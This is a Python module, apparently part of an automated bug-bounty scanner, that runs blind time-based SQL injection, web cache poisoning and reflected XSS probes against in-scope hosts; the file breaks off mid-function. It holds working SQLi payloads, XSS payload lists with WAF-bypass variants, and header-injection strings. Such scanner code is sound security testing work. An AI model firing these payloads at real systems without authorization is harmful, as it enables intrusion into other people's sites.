"""Active baseline probes — deterministic active checks, $0 LLM cost.

These probes complement the passive recon pass and the LLM-driven OWASP
phases by running a small, fixed set of *active* attacks whose signature
is purely structural (not requiring LLM creativity to generate).

Why this exists
---------------
Bug bounty researchers report a steady drumbeat of vulnerabilities whose
exploitation pattern is deterministic but whose *injection point* falls
outside the LLM's natural attack reasoning. Two examples:

1. **Bare-root quote-escape SQLi** (Avira, May-2026 report). Vulnerability
   is in the URL query string of the bare root path with no named
   parameter:

   .. code-block:: text

       GET /?"+IF(LENGTH(DATABASE())=8,SLEEP(5),NULL)+"&x=1

   Backend concatenates the raw query string into a SQL literal. The
   LLM-driven SQLi phase looks for ``?id=`` / ``?search=`` style named
   parameters and never tries the bare-root pattern. This module runs
   that probe deterministically for every in-scope host.

2. (future) Bare-root XXE / SSRF / HTTP-smuggling probes follow the same
   pattern and can plug into the same scaffold.

Cost / safety
-------------
- Probes are time-based blind: send 1 control + 4 short payloads per
  host, time the responses, flag any payload whose elapsed time is
  ``>= control + 3.0s`` AND ``>= 4.0s`` absolute. Threshold tuned to
  ride out network jitter while still catching ``SLEEP(5)``.
- A single re-test confirms a hit before reporting (rules out a transient
  network slowdown).
- Per-host budget: ~5–6 requests, ~20 seconds in the worst case (one
  full SLEEP(5) hit). For a 10-host scope: ~60 requests, ~3 minutes.
- Probes ONLY hit hosts that are already in the scanner's allow-list —
  this module never expands scope.
- Skipped entirely when ``scan_profile == "crawl_only"`` (fuzz traffic
  is forbidden in crawl-only).

This module is intentionally orthogonal to ``passive_recon.py``:
- passive_recon = no payloads, no fuzz, no SLEEP probes
- active_baseline = a tightly scoped set of deterministic active probes
  that the LLM phase would not reliably generate on its own
"""
from __future__ import annotations

import asyncio
import logging
import time
from typing import Iterable
from urllib.parse import urlparse

logger = logging.getLogger(__name__)

# ── Bare-root SQLi probe payloads ──────────────────────────────────────
# Each tuple: (label, raw_query_string). The query string is appended to
# the host root using the bug-bounty report shape:
# ``GET /?<query>?ninjeee=sectest`` (note the second ``?``).
# This keeps the payload as the FIRST query token (so a backend that
# concatenates only the raw query gets the injection at the start of its
# SQL literal) while still adding a deterministic marker.
#
# All payloads expect MySQL-flavour ``SLEEP(5)``. Postgres / MSSQL
# variants are tested too so the probe can fire across DB vendors.
_SLEEP_SECONDS = 5
_BARE_ROOT_PAYLOADS: list[tuple[str, str]] = [
    # Avira-style: double-quote escape, MySQL conditional
    ("mysql_dquote_if",
     '"+IF(LENGTH(DATABASE())%3E0,SLEEP(5),NULL)+"'),
    # Single-quote variant (more common but still rare on bare-root)
    ("mysql_squote_if",
     "%27+IF(LENGTH(DATABASE())%3E0,SLEEP(5),NULL)+%27"),
    # Classic OR-SLEEP — works when the raw query is concatenated into a
    # WHERE clause without any quote wrapping at all
    ("mysql_bool_or_sleep",
     "%27+OR+SLEEP(5)--+-"),
    # Postgres pg_sleep variant
    ("postgres_pg_sleep",
     "%27%3BSELECT+pg_sleep(5)--+-"),
]

# Threshold tuning. Time-based blind SQLi requires the SLEEP to fire AND
# the network jitter to stay below the gap. With SLEEP(5):
#   control ~= 0.5s, attack ~= 5.5s -> delta ~= 5.0s. Comfortable.
# With slow targets (TLS handshake on first hit, geo-distant CDN):
#   control ~= 2.0s, attack ~= 7.0s -> delta ~= 5.0s. Still fine.
# A 3.0s minimum delta plus a 4.0s absolute floor rules out:
#   - a re-handshake making one request 2s slower (delta 2s, no fire)
#   - a slow-but-uniform endpoint (control 4s, attack 4.2s, no fire)
_DELTA_THRESHOLD_S = 3.0
_ABSOLUTE_THRESHOLD_S = 4.0
_REQUEST_TIMEOUT_S = 15.0   # > SLEEP_SECONDS + 5s tolerance
_PER_HOST_CAP_S = 60.0      # circuit-breaker: stop probing a host that's slow

# These headers mirror the bug-bounty PoC enough to avoid some edge-layer
# bot/WAF blocks that otherwise return an immediate 403 before the origin
# app is reached (which would mask a real time-based delay signal).
_PROBE_HEADERS = {
    "User-Agent": (
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
        "(KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
    ),
    "Accept": "*/*",
    "Accept-Language": "en-US,en;q=0.5",
    "Pragma": "no-cache",
    "Cache-Control": "no-cache",
    "Accept-Encoding": "identity",
    "X-BugBounty": "1",
    "X-Intigriti-Username": "1",
}


async def _timed_get(http_client, url: str) -> tuple[float, int | None]:
    """Send a single GET and return (elapsed_seconds, status_code).

    Returns ``(_REQUEST_TIMEOUT_S + 1.0, None)`` on timeout or transport
    error so the caller treats it as "took too long" without raising.
    """
    started = time.perf_counter()
    try:
        # Do NOT follow redirects. Vulnerable origins can still introduce a
        # delay before responding with a redirect; following it would hide
        # the delay from this measurement.
        resp = await http_client.get(
            url,
            timeout=_REQUEST_TIMEOUT_S,
            follow_redirects=False,
            headers=_PROBE_HEADERS,
        )
        elapsed = time.perf_counter() - started
        return elapsed, resp.status_code
    except Exception as exc:  # network, timeout, TLS, anything
        elapsed = time.perf_counter() - started
        logger.debug("bare-root probe transport error on %s: %s", url, exc)
        # Cap elapsed so we don't accidentally flag a 30s timeout as a
        # SQLi hit — return the failure threshold + 1 as a sentinel.
        return _REQUEST_TIMEOUT_S + 1.0, None


def _build_finding(
    *, host: str, payload_label: str, raw_query: str,
    control_elapsed: float, attack_elapsed: float,
    confirmed: bool,
) -> dict:
    """Render a structured AI-Raw finding dict for a confirmed hit."""
    full_url = f"https://{host}/?{raw_query}%3Fninjeee%3Dsectest"
    decoded = (
        raw_query
        .replace("%27", "'")
        .replace("%3B", ";")
        .replace("%3E", ">")
        .replace("+", " ")
    )
    severity = "Critical"
    confidence = "High" if confirmed else "Medium"
    return {
        "title": "Blind Time-Based SQL Injection in Bare Query String",
        "severity": severity,
        "confidence": confidence,
        "owasp_category": "A03:2021",
        "cwe": "CWE-89",
        "url": full_url,
        "parameter": "(raw query string)",
        "payload": decoded,
        "evidence": (
            f"Control GET https://{host}/?ninjeee=sectest returned in "
            f"{control_elapsed:.2f}s. "
            f"Attack GET https://{host}/?{decoded}?ninjeee=sectest returned in "
            f"{attack_elapsed:.2f}s "
            f"(delta {attack_elapsed - control_elapsed:.2f}s). "
            f"SLEEP({_SLEEP_SECONDS}) was triggered, indicating the raw "
            f"query string is concatenated into a SQL literal on the "
            f"server. Confirmed={confirmed}."
        ),
        "remediation": (
            "Do not concatenate the raw query string into SQL. Use "
            "parameterized queries / prepared statements. If the backend "
            "must accept a raw query string, validate against an "
            "allow-list and strip SQL metacharacters before "
            "interpolation."
        ),
        "phase": "Active Baseline (Bare-Root SQLi)",
        "tool": "active_baseline.bare_root_sqli_probe",
        "_finding_source": "active_baseline",
        "_payload_label": payload_label,
    }


def _normalize_hosts(hosts: Iterable[str]) -> list[str]:
    """Take any mix of URLs / hostnames and return a deduped, sorted
    list of bare hostnames (no scheme, no path, no query)."""
    seen: set[str] = set()
    result: list[str] = []
    for h in hosts or []:
        if not h:
            continue
        h = str(h).strip()
        if not h:
            continue
        if "://" in h:
            parsed = urlparse(h)
            host = (parsed.hostname or "").strip().lower()
        else:
            host = h.split("/", 1)[0].split(":", 1)[0].strip().lower()
        if not host or host in seen:
            continue
        seen.add(host)
        result.append(host)
    result.sort()
    return result


async def run_bare_root_sqli_probe(
    http_client,
    hosts: Iterable[str],
    *,
    on_finding: callable | None = None,
    on_progress: callable | None = None,
    cancel_flag=None,
) -> list[dict]:
    """Probe every host's bare root URL for time-based blind SQLi.

    For each host:
      1. Send control ``GET https://<host>/?ninjeee=sectest`` and record elapsed.
      2. For each payload, send ``GET https://<host>/?<payload>?ninjeee=sectest``
         and record elapsed.
      3. If any attack >= control + 3.0s AND >= 4.0s absolute, send the
         attack a second time to rule out network jitter.
      4. If the second attempt also >= control + 3.0s, emit a Critical
         SQLi finding.

    Args:
        http_client: an httpx.AsyncClient (or compatible) already
            configured with the scanner's user agent / cookies / TLS
            settings.
        hosts: iterable of hostnames or URLs in scope. Anything outside
            this list is left alone — we never expand scope.
        on_finding: optional callback invoked with each finding dict.
        on_progress: optional callback ``(event_name, data_dict)`` for
            live progress reporting (mirrors passive_recon's pattern).
        cancel_flag: optional ``threading.Event`` — checked between hosts
            so a user-initiated stop drops out cleanly without finishing
            the remaining probes.

    Returns:
        list[dict] of finding dicts. Empty list if nothing fires.
    """
    findings: list[dict] = []
    _emit = on_finding or (lambda f: None)
    _progress = on_progress or (lambda event, data: None)

    targets = _normalize_hosts(hosts)
    if not targets:
        _progress("active_baseline_skip",
                  {"reason": "no in-scope hosts to probe"})
        return findings

    _progress("active_baseline_start", {
        "probe": "bare_root_sqli",
        "hosts": len(targets),
        "payloads_per_host": len(_BARE_ROOT_PAYLOADS),
        "sleep_seconds": _SLEEP_SECONDS,
    })

    seen_keys: set[tuple[str, str]] = set()

    for host in targets:
        if cancel_flag is not None and getattr(cancel_flag, "is_set", lambda: False)():
            _progress("active_baseline_cancel", {"host": host})
            break

        host_started = time.perf_counter()

        control_url = f"https://{host}/?ninjeee=sectest"
        control_elapsed, control_status = await _timed_get(http_client, control_url)
        if control_status is None:
            _progress("active_baseline_step", {
                "host": host, "step": "control_failed",
                "elapsed_s": round(control_elapsed, 3),
            })
            continue

        for label, payload in _BARE_ROOT_PAYLOADS:
            if cancel_flag is not None and getattr(cancel_flag, "is_set", lambda: False)():
                break
            if (time.perf_counter() - host_started) > _PER_HOST_CAP_S:
                _progress("active_baseline_step", {
                    "host": host, "step": "host_budget_exceeded",
                })
                break
            attack_url = f"https://{host}/?{payload}%3Fninjeee%3Dsectest"
            attack_elapsed, attack_status = await _timed_get(http_client, attack_url)
            if attack_status is None:
                # Transport / TLS / DNS error - NOT a SQLi signal even if
                # the timer ran long. Skip this payload silently.
                _progress("active_baseline_step", {
                    "host": host, "step": "probe_failed", "label": label,
                    "elapsed_s": round(attack_elapsed, 3),
                })
                continue
            delta = attack_elapsed - control_elapsed
            _progress("active_baseline_step", {
                "host": host, "step": "probe", "label": label,
                "control_s": round(control_elapsed, 3),
                "attack_s": round(attack_elapsed, 3),
                "delta_s": round(delta, 3),
            })

            if delta < _DELTA_THRESHOLD_S or attack_elapsed < _ABSOLUTE_THRESHOLD_S:
                continue

            await asyncio.sleep(0.5)
            confirm_elapsed, confirm_status = await _timed_get(http_client, attack_url)
            if confirm_status is None:
                # Confirmation transport failure - refuse to claim a hit
                # without a clean second measurement.
                _progress("active_baseline_step", {
                    "host": host, "step": "confirm_failed", "label": label,
                    "elapsed_s": round(confirm_elapsed, 3),
                })
                continue
            confirm_delta = confirm_elapsed - control_elapsed
            confirmed = (
                confirm_delta >= _DELTA_THRESHOLD_S
                and confirm_elapsed >= _ABSOLUTE_THRESHOLD_S
            )
            _progress("active_baseline_step", {
                "host": host, "step": "confirm", "label": label,
                "confirm_s": round(confirm_elapsed, 3),
                "confirm_delta_s": round(confirm_delta, 3),
                "confirmed": confirmed,
            })
            if not confirmed:
                continue

            key = (host, label)
            if key in seen_keys:
                continue
            seen_keys.add(key)

            f = _build_finding(
                host=host, payload_label=label, raw_query=payload,
                control_elapsed=control_elapsed,
                attack_elapsed=attack_elapsed,
                confirmed=True,
            )
            findings.append(f)
            _emit(f)

    _progress("active_baseline_end", {
        "probe": "bare_root_sqli",
        "hosts": len(targets),
        "findings": len(findings),
    })
    return findings


# ═══════════════════════════════════════════════════════════════════════
# GAP 2 — Web Cache Poisoning Probe
# ═══════════════════════════════════════════════════════════════════════
#
# Bug bounty researchers find cache poisoning by injecting headers like
# X-Forwarded-Host that get reflected into cached responses (Location
# redirect, meta refresh, asset URLs).  This probe:
#   1. Sends a normal GET, records the response body/headers.
#   2. Sends the same GET with poisoning headers containing a unique canary.
#   3. If the canary appears in the response body or Location header,
#      the app is reflecting unkeyed inputs — potential cache poisoning.
#   4. Fetches the URL again WITHOUT the header to see if the poisoned
#      response was cached (canary still present → confirmed).

_CACHE_POISON_HEADERS: list[tuple[str, str]] = [
    ("X-Forwarded-Host", "{canary}"),
    ("X-Host", "{canary}"),
    ("X-Original-URL", "/{canary}"),
    ("X-Rewrite-URL", "/{canary}"),
    ("X-Forwarded-Scheme", "nothttps"),
    ("X-Forwarded-Port", "1337"),
    ("X-Forwarded-Prefix", "/{canary}"),
]


async def run_cache_poisoning_probe(
    http_client,
    hosts: Iterable[str],
    *,
    on_finding: callable | None = None,
    on_progress: callable | None = None,
    cancel_flag=None,
) -> list[dict]:
    """Probe each host for web cache poisoning via unkeyed header reflection."""
    findings: list[dict] = []
    _emit = on_finding or (lambda f: None)
    _progress = on_progress or (lambda event, data: None)

    targets = _normalize_hosts(hosts)
    if not targets:
        return findings

    _progress("active_baseline_start", {
        "probe": "cache_poisoning", "hosts": len(targets),
    })

    import hashlib, os  # noqa: E401
    canary = f"cpcanary{hashlib.md5(os.urandom(4)).hexdigest()[:8]}"

    for host in targets:
        if cancel_flag is not None and getattr(cancel_flag, "is_set", lambda: False)():
            break
        base_url = f"https://{host}/"
        try:
            baseline_resp = await http_client.get(
                base_url, timeout=10.0, follow_redirects=False, headers=_PROBE_HEADERS,
            )
            baseline_body = baseline_resp.text[:50_000]
        except Exception:
            continue

        for hdr_name, hdr_tpl in _CACHE_POISON_HEADERS:
            if cancel_flag is not None and getattr(cancel_flag, "is_set", lambda: False)():
                break
            hdr_val = hdr_tpl.format(canary=canary)
            probe_headers = {**_PROBE_HEADERS, hdr_name: hdr_val}
            cache_buster = f"cb={hashlib.md5(os.urandom(4)).hexdigest()[:6]}"
            probe_url = f"{base_url}?{cache_buster}"
            try:
                probe_resp = await http_client.get(
                    probe_url, timeout=10.0, follow_redirects=False,
                    headers=probe_headers,
                )
            except Exception:
                continue

            reflected = False
            location = str(probe_resp.headers.get("location", ""))
            body = probe_resp.text[:50_000]
            if canary in body or canary in location:
                reflected = True

            if not reflected:
                continue

            _progress("active_baseline_step", {
                "host": host, "step": "cache_poison_reflected",
                "header": hdr_name, "canary": canary,
            })

            await asyncio.sleep(1.0)
            try:
                verify_resp = await http_client.get(
                    probe_url, timeout=10.0, follow_redirects=False,
                    headers=_PROBE_HEADERS,
                )
                verify_body = verify_resp.text[:50_000]
                verify_location = str(verify_resp.headers.get("location", ""))
                cached = canary in verify_body or canary in verify_location
            except Exception:
                cached = False

            severity = "High" if cached else "Medium"
            confidence = "High" if cached else "Medium"
            f = {
                "title": f"Web Cache Poisoning via {hdr_name}",
                "severity": severity,
                "confidence": confidence,
                "owasp_category": "A05:2021",
                "cwe": "CWE-444",
                "url": probe_url,
                "parameter": hdr_name,
                "payload": f"{hdr_name}: {hdr_val}",
                "evidence": (
                    f"Canary '{canary}' reflected in "
                    f"{'response body' if canary in body else 'Location header'} "
                    f"when sent via {hdr_name}. "
                    f"Cache verification: {'CACHED (confirmed poisoning)' if cached else 'not cached (reflection only)'}."
                ),
                "remediation": (
                    f"Ensure {hdr_name} is either stripped by the CDN/cache layer "
                    f"or included in the cache key. Validate and sanitize all "
                    f"host-related headers before reflecting them in responses."
                ),
                "phase": "Active Baseline (Cache Poisoning)",
                "tool": "active_baseline.cache_poisoning_probe",
                "_finding_source": "active_baseline",
            }
            findings.append(f)
            _emit(f)

    _progress("active_baseline_end", {
        "probe": "cache_poisoning", "findings": len(findings),
    })
    return findings


# ═══════════════════════════════════════════════════════════════════════
# GAP 3 — Reflected XSS Probe (Dynamic Discovery)
# ═══════════════════════════════════════════════════════════════════════
#
# Fully generic, zero-hardcoded-param XSS detection.
#
# 1. **Discover** — fetch the target page, parse all query parameters
#    from links (<a href>), forms (<form>/<input>), and inline JS. Also
#    extract bare path segments. This means ANY parameter the app
#    actually uses gets tested — no static list.
# 2. **Probe** — inject a unique canary into each discovered param.
# 3. **Classify** — determine WHERE the canary landed (onclick handler,
#    <script> block, javascript: URI, HTML body, or safe attribute).
# 4. **Escalate** — send context-appropriate payloads (JS-breakout for
#    event handlers, HTML tags for body context) and confirm reflection.
#
# This catches the *class* of bugs, not a specific ticket's params.

import re as _re

_XSS_CANARY_PREFIX = "xsscanary"

# HTML-context payloads (canary landed in plain HTML body)
_XSS_HTML_PAYLOADS: list[tuple[str, str]] = [
    ("basic_script", '<script>alert("XSS")</script>'),
    ("img_onerror", '<img src=x onerror=alert(1)>'),
    ("svg_onload", '<svg onload=alert(1)>'),
    ("waf_bypass_case", '<ScRiPt>alert(1)</ScRiPt>'),
    ("waf_bypass_encoding", '<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>'),
    ("waf_bypass_double", '<<script>alert(1)//<</script>'),
    ("event_handler", '" onfocus=alert(1) autofocus="'),
    ("template_literal", '${alert(1)}'),
    ("js_uri", 'javascript:alert(1)'),
]

# Attribute-context payloads (canary in href/src/style attribute values).
# Goal: break out of the attribute to inject event handlers or new tags.
_XSS_ATTR_PAYLOADS: list[tuple[str, str]] = [
    ("attr_dquote_event", '"><img src=x onerror=alert(1)>'),
    ("attr_squote_event", "'><img src=x onerror=alert(1)>"),
    ("attr_dquote_svg", '"><svg onload=alert(1)>'),
    ("attr_js_uri", "javascript:alert(1)"),
    ("attr_dquote_onfocus", '" onfocus=alert(1) autofocus="'),
    ("attr_squote_onfocus", "' onfocus=alert(1) autofocus='"),
    ("attr_waf_bypass", '"%3E%3Csvg%20onload=alert(1)%3E'),
]

# JS-string-context payloads (canary landed inside onclick/script/js: URI).
# {C} is replaced with a benign identifier so we can detect breakout
# without actually running dangerous code.
_XSS_JS_PAYLOADS: list[tuple[str, str]] = [
    ("js_squote_break", "x')-{C}-('"),
    ("js_dquote_break", 'x")-{C}-("'),
    ("js_backtick_break", "x`-{C}-`"),
    ("js_squote_terminate", "';{C};//"),
    ("js_dquote_terminate", '";{C};//'),
    ("js_hash_eval_bypass", "x')-eval(atob(location.hash.slice(1)))/*{C}*/-('"),
]


# ── Context classification ────────────────────────────────────────────
_JS_CONTEXT_REGEXES = [
    (r"<script\b[^>]*>[^<]*{C}[^<]*</script>", "script_block"),
    (r"\bon[a-z]+\s*=\s*\"[^\"]*{C}[^\"]*\"", "event_handler_attr"),
    (r"\bon[a-z]+\s*=\s*'[^']*{C}[^']*'", "event_handler_attr"),
    (r"\bhref\s*=\s*\"\s*javascript:[^\"]*{C}[^\"]*\"", "javascript_uri"),
    (r"\bhref\s*=\s*'\s*javascript:[^']*{C}[^']*'", "javascript_uri"),
]

_ATTR_CONTEXT_REGEXES = [
    (r"\b(?:href|src|action|formaction|data|poster|srcset)\s*=\s*\"[^\"]*{C}[^\"]*\"", "html_attribute"),
    (r"\b(?:href|src|action|formaction|data|poster|srcset)\s*=\s*'[^']*{C}[^']*'", "html_attribute"),
    (r"\bstyle\s*=\s*\"[^\"]*{C}[^\"]*\"", "html_attribute"),
    (r"\bstyle\s*=\s*'[^']*{C}[^']*'", "html_attribute"),
    (r"url\s*\([^)]*{C}[^)]*\)", "html_attribute"),
]


def _classify_canary_context(body: str, canary: str) -> str | None:
    """Classify where *canary* landed: 'script_block', 'event_handler_attr',
    'javascript_uri', 'html_attribute', 'html_body', or None (not reflected)."""
    if canary not in body:
        return None
    for pattern_tpl, ctx_name in _JS_CONTEXT_REGEXES:
        pattern = pattern_tpl.replace("{C}", _re.escape(canary))
        if _re.search(pattern, body, _re.IGNORECASE | _re.DOTALL):
            return ctx_name
    for pattern_tpl, ctx_name in _ATTR_CONTEXT_REGEXES:
        pattern = pattern_tpl.replace("{C}", _re.escape(canary))
        if _re.search(pattern, body, _re.IGNORECASE | _re.DOTALL):
            return ctx_name
    if _re.search(r">[^<]*" + _re.escape(canary) + r"[^<]*<", body):
        return "html_body"
    return None


# ── Dynamic parameter discovery ───────────────────────────────────────

def _discover_params_from_html(html: str, base_url: str) -> set[str]:
    """Extract every query-parameter name visible in the page.

    Sources:
      - <a href="?foo=1&bar=2">      →  {foo, bar}
      - <form ...><input name="x">   →  {x}
      - onclick="fn('..?p=...')"     →  {p}
      - window.location = '?z=1'     →  {z}
      - <link>/<script src="?v=..">  →  {v}

    Returns a de-duplicated set of parameter names (lowercase).
    """
    params: set[str] = set()

    for m in _re.finditer(r'[?&]([A-Za-z_][A-Za-z0-9_-]{0,40})=', html):
        params.add(m.group(1).lower())

    for m in _re.finditer(
        r'<input\b[^>]*\bname\s*=\s*["\']?([A-Za-z_][A-Za-z0-9_-]{0,40})',
        html, _re.IGNORECASE,
    ):
        params.add(m.group(1).lower())

    for m in _re.finditer(
        r'<select\b[^>]*\bname\s*=\s*["\']?([A-Za-z_][A-Za-z0-9_-]{0,40})',
        html, _re.IGNORECASE,
    ):
        params.add(m.group(1).lower())

    for m in _re.finditer(
        r'<textarea\b[^>]*\bname\s*=\s*["\']?([A-Za-z_][A-Za-z0-9_-]{0,40})',
        html, _re.IGNORECASE,
    ):
        params.add(m.group(1).lower())

    params.discard("")
    return params


# Small fallback set used only when the page returns no discoverable
# params at all (e.g. a blank/error page). Kept deliberately small.
_FALLBACK_PARAMS = ["q", "search", "id", "page", "url", "redirect",
                    "callback", "next", "name"]


async def run_reflected_xss_probe(
    http_client,
    hosts: Iterable[str],
    *,
    crawled_urls: Iterable[str] | None = None,
    on_finding: callable | None = None,
    on_progress: callable | None = None,
    cancel_flag=None,
) -> list[dict]:
    """Probe each host for reflected XSS using dynamic parameter discovery.

    For every in-scope host:
      1. Fetch the root page AND any crawled_urls for that host.
      2. Discover all query params from all fetched pages.
      3. For each param, inject a canary and classify the reflection context.
      4. Send context-appropriate payloads and confirm verbatim reflection.

    The crawled_urls parameter accepts URLs discovered by the SPA crawler
    or any other source — their query params and page content are merged
    into the discovery pool for the matching host.
    """
    findings: list[dict] = []
    _emit = on_finding or (lambda f: None)
    _progress = on_progress or (lambda event, data: None)

    targets = _normalize_hosts(hosts)
    if not targets:
        return findings

    # Group crawled URLs by host for efficient lookup.
    from urllib.parse import urlparse as _urlparse, parse_qs as _parse_qs
    _crawled_by_host: dict[str, list[str]] = {}
    for curl in (crawled_urls or []):
        try:
            h = (_urlparse(curl).hostname or "").lower()
            if h:
                _crawled_by_host.setdefault(h, []).append(curl)
        except Exception:
            continue

    _progress("active_baseline_start", {
        "probe": "reflected_xss", "hosts": len(targets),
    })

    import hashlib, os  # noqa: E401
    canary = f"{_XSS_CANARY_PREFIX}{hashlib.md5(os.urandom(4)).hexdigest()[:8]}"

    for host in targets:
        if cancel_flag is not None and getattr(cancel_flag, "is_set", lambda: False)():
            break
        base_url = f"https://{host}"

        # ── Step 1: Fetch root page + crawled pages, discover params ──
        # Track param → source URLs so we can test canaries against the
        # page where each param was actually found (not just the root).
        param_sources: dict[str, set[str]] = {}

        def _record_params(params: set[str], source_url: str):
            for p in params:
                param_sources.setdefault(p, set()).add(source_url)

        # Root page
        try:
            page_resp = await http_client.get(
                base_url, timeout=10.0, follow_redirects=True,
                headers=_PROBE_HEADERS,
            )
            page_html = page_resp.text[:500_000]
            _record_params(_discover_params_from_html(page_html, base_url), base_url)
        except Exception:
            pass

        # Crawled pages for this host (from SPA crawler, Burp import, etc.)
        # Prioritize URLs with query params (most likely to have testable
        # parameters) and HTML pages over static assets.
        _static_exts = ('.js', '.css', '.png', '.jpg', '.gif', '.svg', '.woff',
                        '.woff2', '.ttf', '.ico', '.map', '.xml', '.json')
        _host_urls = _crawled_by_host.get(host, [])
        _urls_with_qs = [u for u in _host_urls if '?' in u]
        _urls_html = [u for u in _host_urls
                      if '?' not in u
                      and not any(u.lower().endswith(e) for e in _static_exts)]
        _urls_other = [u for u in _host_urls
                       if u not in _urls_with_qs and u not in _urls_html]
        _prioritized = (_urls_with_qs + _urls_html + _urls_other)
        _seen_page_urls: set[str] = set()
        _deduped: list[str] = []
        for _u in _prioritized:
            _p = _urlparse(_u)
            _page_key = f"{_p.scheme}://{_p.netloc}{_p.path or '/'}"
            if _page_key not in _seen_page_urls:
                _seen_page_urls.add(_page_key)
                _deduped.append(_u)
        for curl in _deduped[:30]:
            try:
                parsed = _urlparse(curl)
                # Strip query/fragment to get the clean page URL for canary testing
                page_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path or '/'}"
                # Extract params directly from the crawled URL itself
                url_params = set(k.lower() for k in _parse_qs(parsed.query or ""))
                _record_params(url_params, page_url)
                # Also fetch the page and parse its HTML for more params
                cresp = await http_client.get(
                    curl, timeout=8.0, follow_redirects=True,
                    headers=_PROBE_HEADERS,
                )
                html_params = _discover_params_from_html(cresp.text[:300_000], curl)
                _record_params(html_params, page_url)
            except Exception:
                continue

        discovered = set(param_sources.keys())
        if not discovered:
            discovered = set(_FALLBACK_PARAMS)
            for p in discovered:
                param_sources.setdefault(p, set()).add(base_url)

        _progress("active_baseline_step", {
            "host": host, "step": "xss_params_discovered",
            "count": len(discovered),
            "params": sorted(discovered)[:30],
        })

        # ── Step 2: Canary injection + context classification ─────
        # Test each param against every URL where it was discovered.
        # reflection_points: (param_name, param_template, context, source_base_url)
        reflection_points: list[tuple[str, str, str, str]] = []
        for param in sorted(discovered):
            if cancel_flag is not None and getattr(cancel_flag, "is_set", lambda: False)():
                break
            if len(reflection_points) >= 15:
                break
            test_urls = sorted(param_sources.get(param, {base_url}))
            _found_reflection = False
            for test_base in test_urls:
                sep = "&" if "?" in test_base else "?"
                test_url = f"{test_base}{sep}{param}={canary}"
                try:
                    resp = await http_client.get(
                        test_url, timeout=10.0, follow_redirects=True,
                        headers=_PROBE_HEADERS,
                    )
                    ctx = _classify_canary_context(resp.text[:200_000], canary)
                    if ctx:
                        param_tpl = "?" + param + "={canary}"
                        reflection_points.append((param, param_tpl, ctx, test_base))
                        _progress("active_baseline_step", {
                            "host": host, "step": "xss_reflection_found",
                            "param": param, "context": ctx,
                            "source_url": test_base,
                        })
                        _found_reflection = True
                        break
                except Exception:
                    continue

            # Cross-endpoint fallback: if param didn't reflect on its source
            # pages, try other crawled endpoints on the same host (JSON/data
            # endpoints often reflect query params in their response body).
            if not _found_reflection:
                _cross_eps = [u for u in _deduped[:30]
                              if _urlparse(u).path not in
                              {_urlparse(t).path for t in test_urls}]
                for cross_url in _cross_eps[:8]:
                    cp = _urlparse(cross_url)
                    cross_base = f"{cp.scheme}://{cp.netloc}{cp.path or '/'}"
                    sep = "&" if "?" in cross_base else "?"
                    test_url = f"{cross_base}{sep}{param}={canary}"
                    try:
                        resp = await http_client.get(
                            test_url, timeout=8.0, follow_redirects=True,
                            headers=_PROBE_HEADERS,
                        )
                        ctx = _classify_canary_context(resp.text[:200_000], canary)
                        if ctx:
                            param_tpl = "?" + param + "={canary}"
                            reflection_points.append((param, param_tpl, ctx, cross_base))
                            _progress("active_baseline_step", {
                                "host": host, "step": "xss_cross_endpoint_reflection",
                                "param": param, "context": ctx,
                                "source_url": cross_base,
                            })
                            break
                    except Exception:
                        continue

        # Also test the path segment as a generic injection point.
        try:
            path_url = f"{base_url}/{canary}"
            path_resp = await http_client.get(
                path_url, timeout=10.0, follow_redirects=True,
                headers=_PROBE_HEADERS,
            )
            path_ctx = _classify_canary_context(path_resp.text[:200_000], canary)
            if path_ctx:
                reflection_points.append(("path_segment", "/{canary}", path_ctx, base_url))
        except Exception:
            pass

        # ── Step 2b: Propagation-aware test ─────────────────────
        # Some params (e.g. ?key=) don't reflect on their source page
        # but DO propagate through <a href> links to sub-pages where
        # they reflect in HTML attributes or JS context.  Pattern:
        #   page?key=canary → <a href="/sub/?key=canary"> → sub-page reflects
        # Test the root page AND crawled HTML sub-pages (not just root).
        _propagated_params = set(rp[0] for rp in reflection_points)
        _unreflected = [p for p in sorted(discovered)
                        if p not in _propagated_params]

        _prop_pages = [base_url]
        for _cu in _deduped[:30]:
            _cu_lower = _cu.lower()
            if not any(_cu_lower.endswith(e) for e in _static_exts):
                _cu_p = _urlparse(_cu)
                _cu_base = f"{_cu_p.scheme}://{_cu_p.netloc}{_cu_p.path or '/'}"
                if _cu_base != base_url and _cu_base not in _prop_pages:
                    _prop_pages.append(_cu_base)
        # Cap to avoid excessive requests
        _prop_pages = _prop_pages[:10]

        for param in _unreflected[:5]:
            if cancel_flag is not None and getattr(cancel_flag, "is_set", lambda: False)():
                break
            if len(reflection_points) >= 15:
                break
            _found_prop = False
            for seed_page in _prop_pages:
                if _found_prop:
                    break
                try:
                    sep = "&" if "?" in seed_page else "?"
                    prop_url = f"{seed_page}{sep}{param}={canary}"
                    prop_resp = await http_client.get(
                        prop_url, timeout=10.0, follow_redirects=True,
                        headers=_PROBE_HEADERS,
                    )
                    prop_html = prop_resp.text[:500_000]

                    # Check if the canary reflects directly on this page
                    direct_ctx = _classify_canary_context(
                        prop_html[:200_000], canary)
                    if direct_ctx:
                        prop_parsed = _urlparse(seed_page)
                        prop_base = f"{prop_parsed.scheme}://{prop_parsed.netloc}{prop_parsed.path or '/'}"
                        param_tpl = "?" + param + "={canary}"
                        reflection_points.append(
                            (param, param_tpl, direct_ctx, prop_base))
                        _progress("active_baseline_step", {
                            "host": host,
                            "step": "xss_propagation_direct_reflection",
                            "param": param, "context": direct_ctx,
                            "source_url": prop_base,
                        })
                        _found_prop = True
                        break

                    # Extract <a href> links that carry the canary forward
                    _canary_esc = _re.escape(canary)
                    prop_links = _re.findall(
                        r'<a\b[^>]*\bhref\s*=\s*["\']([^"\']*' +
                        _canary_esc + r'[^"\']*)["\']',
                        prop_html, _re.IGNORECASE,
                    )
                    if not prop_links:
                        prop_links = _re.findall(
                            r'<a\b[^>]*\bhref\s*=\s*([^\s>]*' +
                            _canary_esc + r'[^\s>]*)',
                            prop_html, _re.IGNORECASE,
                        )
                    if not prop_links:
                        continue

                    _progress("active_baseline_step", {
                        "host": host, "step": "xss_propagation_detected",
                        "param": param, "seed_page": seed_page,
                        "link_count": len(prop_links),
                    })

                    for link_href in prop_links[:3]:
                        if link_href.startswith("//"):
                            follow_url = "https:" + link_href
                        elif link_href.startswith("/"):
